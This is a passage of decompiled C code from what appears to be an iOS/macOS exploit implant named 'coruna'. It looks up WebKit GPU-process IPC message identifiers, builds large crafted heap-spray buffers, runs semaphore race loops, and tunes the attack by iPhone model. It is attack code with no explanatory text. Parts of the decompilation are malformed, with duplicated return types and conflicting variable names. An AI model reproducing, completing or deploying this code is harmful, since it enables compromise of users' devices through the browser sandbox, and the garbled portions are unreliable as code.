  *(long *)((long)copy + (unsigned long)*(uint *)(handle + 0x14c)) = addr + 0x10;
  version = *buf;
  str = (unsigned long *)((long)copy + addr + (unsigned long)*(uint *)(handle + 0x150));
  str[1] = buf[1];
  *str = version;
  lk3 = _semaphore_signal(semaphore);
  if (lk3 == 0) {
    *buf = 0;
    buf[1] = 0;
  }
  size = lk3 != 0;
  lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk3 == 0x31) {
    size = 0x31;
  }
  else {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0x10;
    _free(buf);
  }
  return size;
}





uint32_t coruna_implant49c4_str_system_library_frameworks_webkit_framework_webk(long handle)
{
  int err;
  uint64_t *ptr;
  uint64_t u;
  
  ptr = (uint64_t *)
           coruna_dyld_shared_cache_file_path("/System/Library/Frameworks/WebKit.framework/WebKit",
                        "__ZN3IPC6Detail19messageDescriptionsE");
  u = *ptr;
  err = coruna_implant41e4_str_invalid_message_name(u,"Terminate");
  *(short *)(handle + 0x140) = (short)err;
  if (err != 0xffff) {
    err = coruna_implant41e4_str_invalid_message_name(u,"SetStreamDestinationID");
    *(short *)(handle + 0x120) = (short)err;
    if (err != 0xffff) {
      err = coruna_implant41e4_str_invalid_message_name(u,"ProcessOutOfStreamMessage");
      *(short *)(handle + 0x122) = (short)err;
      if (err != 0xffff) {
        err = coruna_implant41e4_str_invalid_message_name(u,"GPUConnectionToWebProcess_CreateRenderingBackend");
        *(short *)(handle + 0x124) = (short)err;
        if (err != 0xffff) {
          err = coruna_implant41e4_str_invalid_message_name(u,"GPUConnectionToWebProcess_CreateRemoteGPU");
          *(short *)(handle + 0x126) = (short)err;
          if (err != 0xffff) {
            err = coruna_implant41e4_str_invalid_message_name(u,"RemoteGPU_RequestAdapter");
            *(short *)(handle + 0x128) = (short)err;
            if (err != 0xffff) {
              err = coruna_implant41e4_str_invalid_message_name(u,"RemoteAdapter_RequestDevice");
              *(short *)(handle + 0x12a) = (short)err;
              if (err != 0xffff) {
                err = coruna_implant41e4_str_invalid_message_name(u,"RemoteDevice_CreateBuffer");
                *(short *)(handle + 300) = (short)err;
                if (err != 0xffff) {
                  err = coruna_implant41e4_str_invalid_message_name(u,"RemoteBuffer_MapAsync");
                  *(short *)(handle + 0x12e) = (short)err;
                  if (err != 0xffff) {
                    err = coruna_implant41e4_str_invalid_message_name(u,"RemoteBuffer_Unmap");
                    *(short *)(handle + 0x130) = (short)err;
                    if (err != 0xffff) {
                      err = coruna_implant41e4_str_invalid_message_name(u,"RemoteRenderingBackend_CreateImageBuffer");
                      *(short *)(handle + 0x132) = (short)err;
                      if (err != 0xffff) {
                        err = coruna_implant41e4_str_invalid_message_name(u,
                                             "RemoteRenderingBackend_GetPixelBufferForImageBuffer");
                        *(short *)(handle + 0x134) = (short)err;
                        if (err != 0xffff) {
                          err = coruna_implant41e4_str_invalid_message_name(u,
                                               "RemoteRenderingBackend_GetPixelBufferForImageBufferWithNewMemory"
                                              );
                          *(short *)(handle + 0x136) = (short)err;
                          if (err != 0xffff) {
                            err = coruna_implant41e4_str_invalid_message_name(u,
                                                 "RemoteRenderingBackend_PutPixelBufferForImageBuffer"
                                                );
                            *(short *)(handle + 0x138) = (short)err;
                            if (err != 0xffff) {
                              err = coruna_implant41e4_str_invalid_message_name(u,"RemoteDevice_CreateBindGroupLayout");
                              *(short *)(handle + 0x13c) = (short)err;
                              if (err != 0xffff) {
                                err = coruna_implant41e4_str_invalid_message_name(u,"RemoteDevice_CreateQuerySet");
                                *(short *)(handle + 0x13a) = (short)err;
                                if (err != 0xffff) {
                                  err = coruna_implant41e4_str_invalid_message_name(u,"RemoteDevice_ImportExternalTexture");
                                  *(short *)(handle + 0x13e) = (short)err;
                                  if (err == 0xffff) {
                                    return 0x38;
                                  }
                                  err = coruna_implant41e4_str_invalid_message_name(u,
                                                  "GPUConnectionToWebProcess_SetNowPlayingInfo");
                                  *(short *)(handle + 0x142) = (short)err;
                                  if (err == 0xffff) {
                                    return 0x38;
                                  }
                                  return 0;
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return 0x38;
}





time_t coruna_difftime_9634(long arg)

{
  uint32_t u;
  time_t lt2;
  time_t lt3;
  int err;
  double ld5;
  
  lt2 = coruna_helper_b494_b3c8();
  if ((int)lt2 != 0) {
    return lt2;
  }
  coruna_mach_msg(arg,2);
  lt2 = _time((time_t *)0x0);
  u = k_implant_float_const_pack;
  do {
    if (*(int *)(arg + 0x10) != 0) {
      lt2 = coruna_semaphore_timedwait_b4a0(0x4a000000,0x40000000,0x3f800000,arg,*(uint64_t *)(arg + 0x30),
                           0,0,0,1,&k_implant_ctx_slot_primary);
      if ((int)lt2 != 0) {
        return lt2;
      }
      err = 3000;
      do {
        *(long *)(arg + 0x70) = *(long *)(arg + 0x70) + 1;
        lt2 = coruna_semaphore_timedwait_b4a0(0x3f800000,0x40000000,0x3f800000,arg,
                             *(uint64_t *)(arg + 0x30),0,0,0,1);
        if ((int)lt2 != 0) {
          return lt2;
        }
        err = err + -1;
      } while (err != 0);
      lt2 = (**(void (**)(arg + 0x158))(arg);
      if ((int)lt2 == 0) {
        coruna_mach_msg(arg,1);
        lt3 = _time((time_t *)0x0);
        lt2 = lt3;
        do {
          if (*(int *)(arg + 0x18) != 0) {
            lt2 = coruna_helper_e8e4_b228(arg,*(uint64_t *)(arg + 0x50));
            if ((int)lt2 != 0) {
              return lt2;
            }
            lt2 = coruna_implant41e4_via_semaphore_signal(arg);
            return lt2;
          }
          coruna_nanosleep(u,lt2);
          lt2 = _time((time_t *)0x0);
          ld5 = _difftime(lt2,lt3);
          lt2 = 5;
        } while (ld5 < 2.0);
      }
      return lt2;
    }
    coruna_nanosleep(u);
    lt3 = _time((time_t *)0x0);
    ld5 = _difftime(lt3,lt2);
  } while (ld5 < 2.0);
  return 5;
}





uint64_t coruna_implant49c4_via_semaphore_timedwait_bc48(long handle)
{
  int err;
  int status;
  uint64_t u;
  uint size;
  long handle;
  
  handle = 0;
  while( true ) {
    err = coruna_semaphore_timedwait_b770(handle,2,1,34000000,handle + *(long *)(handle + 0x68));
    if (err != 0) {
      return 5;
    }
    err = coruna_implant41e4_via_semaphore_signal_2(handle,handle + *(long *)(handle + 0x68),2,0,8);
    if (err != 0) break;
    handle = handle + 1;
    if (handle == 0x51) {
      err = 55000;
      do {
        handle = *(long *)(handle + 0x70) + 1;
        *(long *)(handle + 0x70) = handle;
        status = coruna_semaphore_timedwait_bc48(handle,handle,0);
        if (status != 0) {
          return 5;
        }
        err = err + -1;
      } while (err != 0);
      err = 55000;
      do {
        handle = *(long *)(handle + 0x70) + 1;
        *(long *)(handle + 0x70) = handle;
        status = coruna_semaphore_timedwait_bc48_beb4(handle,handle,0);
        if (status != 0) {
          return 5;
        }
        err = err + -1;
      } while (err != 0);
      size = 0;
      do {
        handle = *(long *)(handle + 0x70) + 1;
        *(long *)(handle + 0x70) = handle;
        err = coruna_semaphore_timedwait_bffc(handle,handle,10000 < size);
        if (err != 0) {
          return 5;
        }
        size = size + 1;
      } while (size != 20000);
      u = (**(void (**)(handle + 0x160))
                        (handle,*(uint64_t *)(handle + 0x30),0xbadf00d,8,
                         *(uint32_t *)(handle + 0xd8),0,10,0x14,0x280000001e);
      return u;
    }
  }
  return 5;
}





uint64_t coruna_implant49c4_via_semaphore_timedwait_ba6c(long handle,long *addr_2,uint64_t val,uint64_t id_2)
{
  uint64_t *ptr;
  uint u;
  bool err;
  int err;
  void *ptr;
  uint64_t size;
  long handle;
  long addr;
  int status;
  unsigned long version;
  
  ptr = _calloc(1,0x4070000);
  size = k_implant_reloc_word_a;
  handle = (long)ptr + 0x2070080;
  version = 0x2070000;
  do {
    addr = 0;
    ptr = (uint64_t *)((long)ptr + version);
    *ptr = size;
    ptr[2] = 0x280000008;
    ptr[1] = 0x280000008;
    ptr[4] = 0x280000008;
    ptr[3] = 0x280000008;
    ptr[6] = 0x280000008;
    ptr[5] = 0x280000008;
    ptr[8] = 0x280000008;
    ptr[7] = 0x280000008;
    ptr[10] = 0x280000008;
    ptr[9] = 0x280000008;
    ptr[0xc] = 0x280000008;
    ptr[0xb] = 0x280000008;
    do {
      ptr = (uint64_t *)(handle + addr);
      *ptr = 0x280000008;
      ptr[1] = 0xffffffffffffffff;
      ptr[2] = val;
      ptr[3] = 2;
      ptr[4] = 0x280000008;
      ptr[5] = 0xffffffffffffffff;
      ptr[6] = val;
      ptr[7] = 2;
      addr = addr + 0x40;
    } while (addr != 0xf80);
    handle = handle + 0x1000;
    err = version < 0x406f000;
    version = version + 0x1000;
  } while (err);
  u = *(int *)(handle + 0x78) << 3;
  version = (unsigned long)u;
  if ((u == 0) ||
     (err = coruna_implant41e4_via_semaphore_signal_2(handle,*(long *)(handle + 0x68) + 0x50,2,version,8), err == 0)) {
    size = coruna_semaphore_timedwait_b934(handle,*(long *)(handle + 0x68) + 0x50,(long)ptr + version,
                         0x4070000 - version);
    _free(ptr);
    if ((int)size != 0) {
      return size;
    }
    status = (int)id_2;
    err = status + 3;
    if (-1 < status) {
      err = status;
    }
    size = (**(void (**)(handle + 0x168))
                      (handle,*(uint64_t *)(handle + 0x30),&k_implant_ctx_slot_primary,0,err >> 2,1,addr_2,
                       id_2,0,status);
    if ((int)size != 0) {
      return size;
    }
    size = coruna_semaphore_timedwait_ba6c(handle,*(uint64_t *)(handle + 0x30),&k_implant_ctx_slot_primary,0,0,0,err >> 2,1);
    if ((int)size != 0) {
      return size;
    }
    if (**(long **)(handle + 0xe0) != *addr_2) {
      *(int *)(handle + 0x78) = *(int *)(handle + 0x78) + 1;
      return 0;
    }
  }
  return 5;
}





uint64_t coruna_implant49c4_via_vm_deallocate(long handle)
{
  uint16_t *ptr;
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  uint64_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  ptr = _malloc(0x1000);
  *ptr = 1;
  ptr[1] = *(uint16_t *)(handle + 0x126);
  *(uint32_t *)(ptr + 2) = 0;
  u = *(uint64_t *)(handle + 0x48);
  *(uint64_t *)(ptr + 4) = 0;
  *(uint64_t *)(ptr + 8) = u;
  u = *(uint64_t *)(handle + 0xc0);
  *(uint64_t *)(ptr + 0xc) = *(uint64_t *)(handle + 0x30);
  *(uint64_t *)(ptr + 0x10) = u;
  *(uint64_t *)(ptr + 0x14) = u;
  scratch[0] = 1;
  bootargs = *(uint32_t *)(handle + 0xd0);
  thread_attr = k_implant_rodata_word_eb88;
  u = coruna_vm_deallocate(ptr,ptr,0x30,scratch,&bootargs,*(uint32_t *)(handle + 4));
  _free(ptr);
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_semaphore_timedwait_9ba0(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint32_t size,
            uint8_t buf,uint32_t flags_2,uint32_t version_3,uint64_t val)
{
  unsigned long u;
  kern_return_t lk2;
  unsigned long *ptr;
  uint64_t size;
  uint32_t scratch[2];
  uint32_t bootargs[2];
  uint32_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  ptr = _malloc(0x1000);
  *(uint16_t *)ptr = 0;
  *(uint16_t *)((long)ptr + 2) = *(uint16_t *)(handle + 0x136);
  *(uint32_t *)((long)ptr + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[1] = arg;
  ptr[2] = u;
  ptr[3] = arg;
  ptr[4] = val;
  *(uint8_t *)(ptr + 5) = 0;
  *(uint8_t *)((long)ptr + 0x29) = buf;
  *(uint8_t *)((long)ptr + 0x2a) = 0;
  *(uint32_t *)((long)ptr + 0x2c) = 0;
  ptr[6] = 0x11;
  *(uint8_t *)(ptr + 9) = 0x42;
  size = s_kCGColorSpaceSRGB_0000feaa._0_8_;
  ptr[8] = s_kCGColorSpaceSRGB_0000feaa._8_8_;
  ptr[7] = size;
  *(uint32_t *)((long)ptr + 0x49) = flags_2;
  *(uint32_t *)((long)ptr + 0x4d) = version_3;
  *(uint8_t *)((long)ptr + 0x51) = (uint8_t)val;
  *(long *)((long)ptr + 0x55) = (long)val._4_4_;
  scratch[0] = 1;
  thread_attr = 0x130000;
  bootargs[0] = size;
  coruna_vm_deallocate(ptr,ptr,0x59,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  *(uint64_t *)((long)ptr + 0x12) = 0;
  *(uint64_t *)((long)ptr + 10) = 0;
  *(uint64_t *)((long)ptr + 0x22) = 0;
  *(uint64_t *)((long)ptr + 0x1a) = 0;
  *(uint64_t *)((long)ptr + 0x32) = 0;
  *(uint64_t *)((long)ptr + 0x2a) = 0;
  *(uint64_t *)((long)ptr + 0x42) = 0;
  *(uint64_t *)((long)ptr + 0x3a) = 0;
  *(uint64_t *)((long)ptr + 0x51) = 0;
  *(uint64_t *)((long)ptr + 0x49) = 0;
  *ptr = (unsigned long)*(ushort *)(handle + 0x122);
  *(uint16_t *)(ptr + 1) = 0;
  size = coruna_semaphore_signal(0x80000000,*(long *)(handle + 0x20) + 10,ptr,10,1,handle,
                       *(uint64_t *)(handle + 0xf8));
  lk2 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk2 == 0x31) {
    size = 0x31;
  }
  else {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 10;
    _free(ptr);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return size;
  }
  ___stack_chk_fail();
}





uint8_t
void coruna_semaphore_timedwait_9d54(long handle,uint64_t val,unsigned long arg,uint8_t buf,uint size,
            uint flags_2,void *ctx,size_t len,uint64_t id_2,uint64_t size_3,
            uint64_t off_4,byte arg_x)
{
  size_t ls1;
  unsigned long *ptr;
  uint32_t *buf;
  uint u;
  semaphore_t ls5;
  uint64_t size;
  kern_return_t lk7;
  kern_return_t lk8;
  unsigned long *str;
  long handle;
  long addr;
  unsigned long version;
  uint64_t *copy;
  
  str = _malloc(len + 0x1000);
  if (*(int *)(handle + 0x78) == 0) {
    *(uint *)str = (uint)*(ushort *)(handle + 0x120);
    *(uint64_t *)((long)str + 6) = val;
    handle = *(long *)(handle + 0x20);
    copy = *(uint64_t **)(handle + 0xf8);
    addr = 0x18;
    if (*(uint64_t **)(handle + 200) != copy) {
      addr = 0x10;
    }
    ls5 = *(semaphore_t *)(handle + addr);
    *copy = 0x80000000;
    *(long *)((long)copy + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0xe;
    ptr = (unsigned long *)((long)copy + handle + (unsigned long)*(uint *)(handle + 0x150));
    version = *str;
    *(uint64_t *)((long)ptr + 6) = *(uint64_t *)((long)str + 6);
    *ptr = version;
    lk7 = _semaphore_signal(ls5);
    if (lk7 == 0) {
      *(uint64_t *)((long)str + 6) = 0;
      *str = 0;
    }
    lk7 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
    if (lk7 == 0x31) {
      return 0x31;
    }
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0xe;
  }
  *str = (unsigned long)*(ushort *)(handle + 0x138);
  str[1] = arg;
  *(uint8_t *)(str + 2) = 0;
  *(uint8_t *)((long)str + 0x11) = buf;
  *(uint8_t *)((long)str + 0x12) = 0;
  *(uint *)((long)str + 0x14) = 0;
  str[3] = 0x11;
  *(uint8_t *)(str + 6) = 0x42;
  size = s_kCGColorSpaceSRGB_0000feaa._0_8_;
  str[5] = s_kCGColorSpaceSRGB_0000feaa._8_8_;
  str[4] = size;
  *(uint *)((long)str + 0x34) = size;
  *(uint *)(str + 7) = flags_2;
  if (len == 0) {
    addr = 0x3c;
  }
  else {
    _memcpy((uint *)((long)str + 0x3c),ctx,len);
    addr = len + 0x3c;
  }
  buf = (uint32_t *)((long)str + addr);
  *buf = (uint32_t)id_2;
  buf[1] = id_2._4_4_;
  buf[2] = (uint32_t)size_3;
  buf[3] = size_3._4_4_;
  buf[4] = (uint32_t)off_4;
  buf[5] = off_4._4_4_;
  *(ushort *)(buf + 6) = (ushort)arg_x;
  ls1 = addr + 0x1a;
  handle = *(long *)(handle + 0x20);
  copy = *(uint64_t **)(handle + 0xf8);
  addr = 0x18;
  if (*(uint64_t **)(handle + 200) != copy) {
    addr = 0x10;
  }
  ls5 = *(semaphore_t *)(handle + addr);
  *copy = 0x80000000;
  u = *(uint *)(handle + 0x150);
  *(size_t *)((long)copy + (unsigned long)*(uint *)(handle + 0x14c)) = handle + ls1;
  _memcpy((void *)((long)copy + handle + (unsigned long)u),str,ls1);
  lk7 = _semaphore_signal(ls5);
  if (lk7 == 0) {
    _bzero(str,ls1);
  }
  lk8 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk8 == 0x31) {
    return 0x31;
  }
  *(size_t *)(handle + 0x20) = *(long *)(handle + 0x20) + ls1;
  _free(str);
  return lk7 != 0;
}





uint32_t coruna_implant49c4_str_system_library_frameworks_webkit_framework_webk_2(long handle)
{
  int err;
  uint64_t u;
  
  u = coruna_dyld_shared_cache_file_path("/System/Library/Frameworks/WebKit.framework/WebKit",
                       "__ZN3IPC11descriptionENS_11MessageNameE");
  err = coruna_implant41e4_residual_7(u,"Terminate");
  *(short *)(handle + 0x140) = (short)err;
  if (err != 0xffff) {
    err = coruna_implant41e4_residual_7(u,"SetStreamDestinationID");
    *(short *)(handle + 0x120) = (short)err;
    if (err != 0xffff) {
      err = coruna_implant41e4_residual_7(u,"ProcessOutOfStreamMessage");
      *(short *)(handle + 0x122) = (short)err;
      if (err != 0xffff) {
        err = coruna_implant41e4_residual_7(u,"GPUConnectionToWebProcess_CreateRenderingBackend");
        *(short *)(handle + 0x124) = (short)err;
        if (err != 0xffff) {
          err = coruna_implant41e4_residual_7(u,"GPUConnectionToWebProcess_CreateRemoteGPU");
          *(short *)(handle + 0x126) = (short)err;
          if (err != 0xffff) {
            err = coruna_implant41e4_residual_7(u,"RemoteGPU_RequestAdapter");
            *(short *)(handle + 0x128) = (short)err;
            if (err != 0xffff) {
              err = coruna_implant41e4_residual_7(u,"RemoteAdapter_RequestDevice");
              *(short *)(handle + 0x12a) = (short)err;
              if (err != 0xffff) {
                err = coruna_implant41e4_residual_7(u,"RemoteDevice_CreateBuffer");
                *(short *)(handle + 300) = (short)err;
                if (err != 0xffff) {
                  err = coruna_implant41e4_residual_7(u,"RemoteBuffer_MapAsync");
                  *(short *)(handle + 0x12e) = (short)err;
                  if (err != 0xffff) {
                    err = coruna_implant41e4_residual_7(u,"RemoteBuffer_Unmap");
                    *(short *)(handle + 0x130) = (short)err;
                    if (err != 0xffff) {
                      err = coruna_implant41e4_residual_7(u,"RemoteRenderingBackend_CreateImageBuffer");
                      *(short *)(handle + 0x132) = (short)err;
                      if (err != 0xffff) {
                        err = coruna_implant41e4_residual_7(u,
                                             "RemoteRenderingBackend_GetPixelBufferForImageBuffer");
                        *(short *)(handle + 0x134) = (short)err;
                        if (err != 0xffff) {
                          err = coruna_implant41e4_residual_7(u,
                                               "RemoteRenderingBackend_GetPixelBufferForImageBufferWithNewMemory"
                                              );
                          *(short *)(handle + 0x136) = (short)err;
                          if (err != 0xffff) {
                            err = coruna_implant41e4_residual_7(u,
                                                 "RemoteRenderingBackend_PutPixelBufferForImageBuffer"
                                                );
                            *(short *)(handle + 0x138) = (short)err;
                            if (err != 0xffff) {
                              err = coruna_implant41e4_residual_7(u,"RemoteDevice_CreateQuerySet");
                              *(short *)(handle + 0x13a) = (short)err;
                              if (err == 0xffff) {
                                return 0x38;
                              }
                              err = coruna_implant41e4_residual_7(u,
                                                  "GPUConnectionToWebProcess_SetNowPlayingInfo");
                              *(short *)(handle + 0x142) = (short)err;
                              if (err == 0xffff) {
                                return 0x38;
                              }
                              return 0;
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return 0x38;
}





uint64_t coruna_difftime(long handle)
{
  uint32_t u;
  uint64_t size;
  time_t lt3;
  time_t lt4;
  double ld5;
  
  size = coruna_helper_b494_b3c8();
  if ((int)size != 0) {
    return size;
  }
  coruna_mach_msg(handle,2);
  lt3 = _time((time_t *)0x0);
  u = k_implant_float_const_pack;
  while (*(int *)(handle + 0x10) == 0) {
    coruna_nanosleep(u);
    lt4 = _time((time_t *)0x0);
    ld5 = _difftime(lt4,lt3);
    if (2.0 <= ld5) {
      return 5;
    }
  }
  size = coruna_semaphore_timedwait_b4a0(0x4a000000,0x40000000,0x3f800000,handle,*(uint64_t *)(handle + 0x30),0,0,
                       0,1,&k_implant_ctx_slot_primary);
  if ((int)size != 0) {
    return size;
  }
  coruna_dispatch_source_set_event_handler(handle);
  size = (**(void (**)(handle + 0x158))(handle);
  if ((int)size == 0) {
    lt4 = _time((time_t *)0x0);
    lt3 = lt4;
    do {
      if (*(int *)(handle + 0x18) != 0) {
        size = coruna_helper_e8e4_b228(handle,*(uint64_t *)(handle + 0x50));
        if ((int)size != 0) {
          return size;
        }
        size = coruna_implant41e4_via_semaphore_signal(handle);
        return size;
      }
      coruna_nanosleep(u,lt3);
      lt3 = _time((time_t *)0x0);
      ld5 = _difftime(lt3,lt4);
      lt3 = 5;
    } while (ld5 < 2.0);
    return 5;
  }
  return size;
}





void coruna_sysctlbyname_a2dc(long handle)
{
  int err;
  uint u;
  long handle;
  unsigned long size;
  size_t scratch;
  uint32_t bootargs;
  uint64_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  long thread_attr;
  
  handle = 0;
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  do {
    err = coruna_semaphore_timedwait_b770(handle,2,1,34000000,handle + *(long *)(handle + 0x68));
    if ((err != 0) ||
       (err = coruna_implant41e4_via_semaphore_signal_2(handle,handle + *(long *)(handle + 0x68),2,0,8), err != 0))
    goto fail;
    handle = handle + 1;
  } while (handle != 0x4c);
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch = 0;
  serial_buf = 0;
  host_info = 0;
  scratch = 0x20;
  u = _sysctlbyname("hw.product",&bootargs,&scratch,(void *)0x0,0);
  size = (unsigned long)u;
  if (u != 0xffffffff) {
    size = 0;
    u = 100000;
    if (coruna_cat(scratch,bootargs) != 0x3031656e6f685069 ||
        coruna_cat(bootargs,scratch) != 0x312c3031656e6f) {
      u = 120000;
    }
    do {
      err = coruna_semaphore_timedwait_f060(handle,size + *(long *)(handle + 0x70),u - 100 < size);
      if (err != 0) goto fail;
      size = size + 1;
    } while (u != size);
    size = (**(void (**)(handle + 0x160))
                      (handle,*(uint64_t *)(handle + 0x30),0xbadf00d,8,
                       *(uint32_t *)(handle + 0xd8),0,10,0x14,0x280000001e);
  }
done:
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(size);
fail:
  size = 5;
  goto done;
}





uint64_t coruna_implant49c4_via_nanosleep(long handle,long *addr_2,uint64_t val,uint64_t id_2)
{
  uint64_t *ptr;
  uint u;
  uint64_t size;
  bool err;
  int err;
  void *ptr;
  uint64_t version;
  long handle;
  unsigned long port;
  int status;
  unsigned long tag;
  long addr;
  
  addr = 0x2070040;
  ptr = _calloc(1,0x4070000);
  size = k_implant_reloc_word_b;
  version = k_implant_reloc_word_a;
  handle = 0x2070050;
  tag = 0x2070000;
  do {
    port = 0;
    ptr = (uint64_t *)((long)ptr + tag);
    *ptr = version;
    ptr[2] = 0x280000008;
    ptr[1] = 0x280000008;
    ptr[4] = 0x280000008;
    ptr[3] = 0x280000008;
    do {
      *(uint64_t *)((long)ptr + port + addr) = size;
      *(uint64_t *)((long)ptr + port + handle + -8) = 0xffffffffffffffff;
      *(uint64_t *)((long)ptr + port + handle) = val;
      *(uint64_t *)((long)ptr + port + handle + 8) = 2;
      port = port + 0x20;
    } while (port < 0xfa8);
    handle = handle + 0x1000;
    addr = addr + 0x1000;
    err = tag < 0x406f000;
    tag = tag + 0x1000;
  } while (err);
  coruna_nanosleep(k_implant_float_const_01);
  u = *(int *)(handle + 0x78) << 3;
  tag = (unsigned long)u;
  if ((u == 0) ||
     (err = coruna_implant41e4_via_semaphore_signal_2(handle,*(long *)(handle + 0x68) + 0x4b,2,tag,8), err == 0)) {
    version = coruna_semaphore_timedwait_b934(handle,*(long *)(handle + 0x68) + 0x4b,(long)ptr + tag,
                         0x4070000 - tag);
    _free(ptr);
    if ((int)version != 0) {
      return version;
    }
    status = (int)id_2;
    err = status + 3;
    if (-1 < status) {
      err = status;
    }
    version = (**(void (**)(handle + 0x168))
                      (handle,*(uint64_t *)(handle + 0x30),&k_implant_ctx_slot_primary,0,err >> 2,1,addr_2,
                       id_2,0,status);
    if ((int)version != 0) {
      return version;
    }
    version = coruna_semaphore_timedwait_bbc4(handle,*(uint64_t *)(handle + 0x30),&k_implant_ctx_slot_primary,0,0,0,err >> 2,1);
    if ((int)version != 0) {
      return version;
    }
    if (**(long **)(handle + 0xe0) != *addr_2) {
      *(int *)(handle + 0x78) = *(int *)(handle + 0x78) + 1;
      return 0;
    }
  }
  return 5;
}





uint64_t
void coruna_semaphore_timedwait_a674(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint32_t size,
            uint8_t buf,uint32_t flags_2,uint32_t version_3,uint64_t val)
{
  unsigned long u;
  kern_return_t lk2;
  unsigned long *ptr;
  uint64_t size;
  uint32_t scratch[2];
  uint32_t bootargs[2];
  uint32_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  ptr = _malloc(0x1000);
  *(uint16_t *)ptr = 0;
  *(uint16_t *)((long)ptr + 2) = *(uint16_t *)(handle + 0x136);
  *(uint32_t *)((long)ptr + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[1] = arg;
  ptr[2] = u;
  ptr[3] = arg;
  ptr[4] = val;
  ptr[5] = val;
  *(uint8_t *)(ptr + 6) = 0;
  *(uint8_t *)((long)ptr + 0x31) = buf;
  *(uint8_t *)((long)ptr + 0x32) = 0;
  *(uint32_t *)((long)ptr + 0x34) = 0;
  ptr[7] = 0x11;
  *(uint8_t *)(ptr + 10) = 0x42;
  size = s_kCGColorSpaceSRGB_0000feaa._0_8_;
  ptr[9] = s_kCGColorSpaceSRGB_0000feaa._8_8_;
  ptr[8] = size;
  *(uint32_t *)((long)ptr + 0x51) = flags_2;
  *(uint32_t *)((long)ptr + 0x55) = version_3;
  *(uint8_t *)((long)ptr + 0x59) = (uint8_t)val;
  *(long *)((long)ptr + 0x5d) = (long)val._4_4_;
  scratch[0] = 1;
  thread_attr = 0x130000;
  bootargs[0] = size;
  coruna_vm_deallocate(ptr,ptr,0x61,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  *(uint64_t *)((long)ptr + 0x12) = 0;
  *(uint64_t *)((long)ptr + 10) = 0;
  *(uint64_t *)((long)ptr + 0x22) = 0;
  *(uint64_t *)((long)ptr + 0x1a) = 0;
  *(uint64_t *)((long)ptr + 0x32) = 0;
  *(uint64_t *)((long)ptr + 0x2a) = 0;
  *(uint64_t *)((long)ptr + 0x42) = 0;
  *(uint64_t *)((long)ptr + 0x3a) = 0;
  *(uint64_t *)((long)ptr + 0x52) = 0;
  *(uint64_t *)((long)ptr + 0x4a) = 0;
  *(uint64_t *)((long)ptr + 0x59) = 0;
  *ptr = (unsigned long)*(ushort *)(handle + 0x122);
  *(uint16_t *)(ptr + 1) = 0;
  size = coruna_semaphore_signal(0x80000000,*(long *)(handle + 0x20) + 10,ptr,10,1,handle,
                       *(uint64_t *)(handle + 0xf8));
  lk2 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk2 == 0x31) {
    size = 0x31;
  }
  else {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 10;
    _free(ptr);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return size;
  }
  ___stack_chk_fail();
}





short coruna_implant41e4_residual_7(void (*arg,char *path)
{
  int err;
  char *ptr;
  char *buf;
  short ls4;
  
  ptr = (char *)(*arg)(0x2000);
  if (ptr != (char *)0x0) {
    ls4 = 0;
    do {
      buf = (char *)(*arg)(ls4);
      err = _strcmp(buf,path);
      if (err == 0) {
        return ls4;
      }
      ls4 = ls4 + 1;
    } while (buf != ptr);
  }
  return -1;
}





short coruna_implant41e4_str_invalid_message_name(char *path,char *str_2)
{
  int err;
  size_t ls2;
  short ls3;
  
  err = _strcmp(path,str_2);
  ls3 = 0;
  while( true ) {
    if (err == 0) {
      return ls3;
    }
    err = _strcmp(path,"<invalid message name>");
    if (err == 0) break;
    ls2 = _strlen(path);
    path = path + ls2 + 1;
    ls3 = ls3 + 1;
    err = _strcmp(path,str_2);
  }
  return -1;
}





int coruna_nanosleep(float arg)
{
  int err;
  timespec scratch;
  timespec bootargs;
  
  bootargs.tv_sec = (__darwin_time_t)arg;
  bootargs.tv_nsec = (long)((arg - (float)bootargs.tv_sec) * k_implant_rodata_word_eba8);
  err = _nanosleep(&bootargs,&scratch);
  if (err == -1) {
    err = _nanosleep(&scratch,(timespec *)0x0);
  }
  return err;
}
uint64_t coruna_dispatch_sync(long handle)
{
  uint64_t u;
  uint64_t size;
  int err;
  long handle;
  uint64_t version;
  void (*ptr)(void);
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  _dlerror();
  if (*(short *)(handle + 0x140) == 0) {
